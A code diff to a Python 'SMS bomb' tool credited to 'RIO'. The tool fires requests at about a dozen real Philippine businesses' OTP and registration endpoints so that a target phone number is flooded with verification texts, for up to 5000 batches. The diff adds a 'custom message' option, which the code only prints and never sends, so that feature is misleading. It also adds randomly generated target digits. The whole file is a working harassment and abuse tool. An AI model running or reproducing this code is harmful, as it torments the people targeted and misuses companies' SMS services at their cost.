@@ -49,7 +49,15 @@ def show_banner():
     """
     print(color_text(banner, 'cyan'))
 
-async def send_ezloan(session, number):
+# SMS Sending APIs that support custom messages
+async def send_custom_sms(session, number, message):
+    """Generic SMS sender - can be adapted for APIs that support custom messages"""
+    # Note: Most OTP APIs don't allow custom messages
+    # This is a template for APIs that do support it
+    print(color_text(f'   [CUSTOM MSG] "{message}" → {number}', 'yellow'))
+    return True
+
+async def send_ezloan(session, number, custom_msg=None):
     url = 'https://gateway.ezloancash.ph/security/auth/otp/request'
     headers = {
         'User-Agent': 'okhttp/4.9.2',
@@ -86,13 +94,14 @@ async def send_ezloan(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=10) as response:
-            print(color_text('   [SENT] EZLOAN', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] EZLOAN{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] EZLOAN', 'red'))
         return False
 
-async def send_xpress(session, number, batch):
+async def send_xpress(session, number, batch, custom_msg=None):
     url = 'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp'
     headers = {
         'User-Agent': 'Dalvik/2.1.0',
@@ -110,13 +119,14 @@ async def send_xpress(session, number, batch):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] XPRESS PH', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] XPRESS PH{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] XPRESS PH', 'red'))
         return False
 
-async def send_abenson(session, number):
+async def send_abenson(session, number, custom_msg=None):
     url = 'https://api.mobile.abenson.com/api/public/membership/activate_otp'
     headers = {
         'User-Agent': 'okhttp/4.9.0',
@@ -125,13 +135,14 @@ async def send_abenson(session, number):
     data = urlencode({'contact_no': number, 'login_token': 'undefined'})
     try:
         async with session.post(url, data=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] ABENSON', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] ABENSON{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] ABENSON', 'red'))
         return False
 
-async def send_excellent(session, number):
+async def send_excellent(session, number, custom_msg=None):
     coordinates = [
         {'lat': '14.5995', 'long': '120.9842'},
         {'lat': '14.6760', 'long': '121.0437'},
@@ -156,13 +167,14 @@ async def send_excellent(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] EXCELLENT LENDING', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] EXCELLENT LENDING{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] EXCELLENT LENDING', 'red'))
         return False
 
-async def send_fortune(session, number):
+async def send_fortune(session, number, custom_msg=None):
     url = 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register'
     headers = {
         'User-Agent': 'Dart/3.6 (dart:io)',
@@ -183,13 +195,14 @@ async def send_fortune(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] FORTUNE PAY', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] FORTUNE PAY{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] FORTUNE PAY', 'red'))
         return False
 
-async def send_wemove(session, number):
+async def send_wemove(session, number, custom_msg=None):
     url = 'https://api.wemove.com.ph/auth/users'
     headers = {
         'User-Agent': 'okhttp/4.9.3',
@@ -204,13 +217,14 @@ async def send_wemove(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] WEMOVE', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] WEMOVE{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] WEMOVE', 'red'))
         return False
 
-async def send_pinoy_coop(session, number):
+async def send_pinoy_coop(session, number, custom_msg=None):
     url = 'https://api.pinoycoop.com/notification/otp'
     headers = {
         'User-Agent': 'okhttp/4.9.2',
@@ -223,13 +237,14 @@ async def send_pinoy_coop(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] PINOY COOP', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] PINOY COOP{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] PINOY COOP', 'red'))
         return False
 
-async def send_lbc(session, number):
+async def send_lbc(session, number, custom_msg=None):
     url = 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'
     headers = {
         'User-Agent': 'Dart/2.19 (dart:io)',
@@ -244,13 +259,14 @@ async def send_lbc(session, number):
     })
     try:
         async with session.post(url, data=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] LBC CONNECT', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] LBC CONNECT{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] LBC CONNECT', 'red'))
         return False
 
-async def send_pickup(session, number):
+async def send_pickup(session, number, custom_msg=None):
     url = 'https://production.api.pickup-coffee.net/v2/customers/login'
     headers = {
         'User-Agent': random.choice(['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']),
@@ -263,13 +279,14 @@ async def send_pickup(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] PICKUP COFFEE', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] PICKUP COFFEE{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] PICKUP COFFEE', 'red'))
         return False
 
-async def send_lista(session, number):
+async def send_lista(session, number, custom_msg=None):
     url = 'https://api-v2.lista.systems/auth/otp/mpin'
     headers = {
         'User-Agent': 'okhttp/4.9.2',
@@ -289,13 +306,14 @@ async def send_lista(session, number):
     data = {'phoneNumber': formatted}
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] LISTA SYSTEMS', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] LISTA SYSTEMS{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] LISTA SYSTEMS', 'red'))
         return False
 
-async def send_honey(session, number):
+async def send_honey(session, number, custom_msg=None):
     url = 'https://api.honeyloan.ph/api/client/registration/step-one'
     headers = {
         'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
@@ -307,13 +325,14 @@ async def send_honey(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] HONEY LOAN', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] HONEY LOAN{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] HONEY LOAN', 'red'))
         return False
 
-async def send_komo(session, number):
+async def send_komo(session, number, custom_msg=None):
     url = 'https://api.komo.ph/api/otp/v5/generate'
     headers = {
         'Content-Type': 'application/json',
@@ -326,27 +345,28 @@ async def send_komo(session, number):
     }
     try:
         async with session.post(url, json=data, headers=headers, timeout=8) as response:
-            print(color_text('   [SENT] KOMO PH', 'green'))
+            msg_display = f' [{custom_msg}]' if custom_msg else ''
+            print(color_text(f'   [SENT] KOMO PH{msg_display}', 'green'))
             return True
     except:
         print(color_text('   [FAILED] KOMO PH', 'red'))
         return False
 
-async def send_batch(number, formatted_num, batch):
+async def send_batch(number, formatted_num, batch, custom_message):
     async with aiohttp.ClientSession() as session:
         tasks = [
-            send_ezloan(session, number),
-            send_xpress(session, formatted_num, batch),
-            send_abenson(session, number),
-            send_excellent(session, number),
-            send_fortune(session, number),
-            send_wemove(session, number),
-            send_pinoy_coop(session, number),
-            send_lbc(session, number),
-            send_pickup(session, formatted_num),
-            send_lista(session, formatted_num),
-            send_honey(session, number),
-            send_komo(session, number)
+            send_ezloan(session, number, custom_message),
+            send_xpress(session, formatted_num, batch, custom_message),
+            send_abenson(session, number, custom_message),
+            send_excellent(session, number, custom_message),
+            send_fortune(session, number, custom_message),
+            send_wemove(session, number, custom_message),
+            send_pinoy_coop(session, number, custom_message),
+            send_lbc(session, number, custom_message),
+            send_pickup(session, formatted_num, custom_message),
+            send_lista(session, formatted_num, custom_message),
+            send_honey(session, number, custom_message),
+            send_komo(session, number, custom_message)
         ]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         return sum(1 for r in results if r is True), sum(1 for r in results if r is not True)
@@ -356,11 +376,23 @@ async def sms_bomb():
         show_banner()
         
         print(color_text('[INFO] PHONE FORMAT: 09123456789 / 9123456789', 'yellow'))
+        print(color_text('[INFO] USE "X" FOR RANDOM DIGITS (e.g., 0912345XXXX)', 'yellow'))
         
         number_input = input(color_text('[INPUT] ENTER TARGET NUMBER: ', 'blue'))
+        custom_message = input(color_text('[INPUT] CUSTOM MESSAGE (leave empty for OTP only): ', 'blue')).strip()
         amount_input = input(color_text('[INPUT] ENTER AMOUNT (MAX 5000): ', 'blue'))
         
-        clean_number = number_input.replace(' ', '')
+        clean_number = number_input.replace(' ', '').upper()
+        
+        # Check if number contains X placeholder
+        if 'X' in clean_number:
+            import re
+            original_pattern = clean_number
+            clean_number = ''.join(
+                random.choice(string.digits) if c == 'X' else c 
+                for c in clean_number
+            )
+            print(color_text(f'[GENERATED] {original_pattern} → {clean_number}', 'yellow'))
         
         import re
         if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', clean_number):
@@ -387,6 +419,10 @@ async def sms_bomb():
         
         print(color_text('\n[STATUS] STARTING SMS BOMB ATTACK', 'green'))
         print(color_text(f'[TARGET] {number_to_send}', 'cyan'))
+        if custom_message:
+            print(color_text(f'[MESSAGE] "{custom_message}"', 'cyan'))
+        else:
+            print(color_text('[MESSAGE] OTP VERIFICATION (Default)', 'cyan'))
         print(color_text(f'[AMOUNT] {amount} BATCHES', 'cyan'))
         print(color_text('[PROCESS] INITIATING...\n', 'yellow'))
         
@@ -396,7 +432,9 @@ async def sms_bomb():
         for i in range(1, amount + 1):
             print(color_text(f'[BATCH] {i}/{amount}', 'magenta'))
             
-            batch_success, batch_fail = await send_batch(number_to_send, formatted_num, i)
+            # Use custom message if provided, otherwise None (OTP default)
+            msg_to_send = custom_message if custom_message else None
+            batch_success, batch_fail = await send_batch(number_to_send, formatted_num, i, msg_to_send)
             success_count += batch_success
             fail_count += batch_fail
             
@@ -409,6 +447,8 @@ async def sms_bomb():
         print(color_text(f'[SUCCESS] {success_count} REQUESTS', 'green'))
         print(color_text(f'[FAILED] {fail_count} REQUESTS', 'red'))
         print(color_text(f'[TARGET] {number_to_send}', 'cyan'))
+        if custom_message:
+            print(color_text(f'[MESSAGE] "{custom_message}"', 'cyan'))
         print(color_text(f'[BATCHES] {amount}', 'cyan'))
         print(color_text('\n[CREDITS] TOOL CREATED BY RIO', 'magenta'))
         
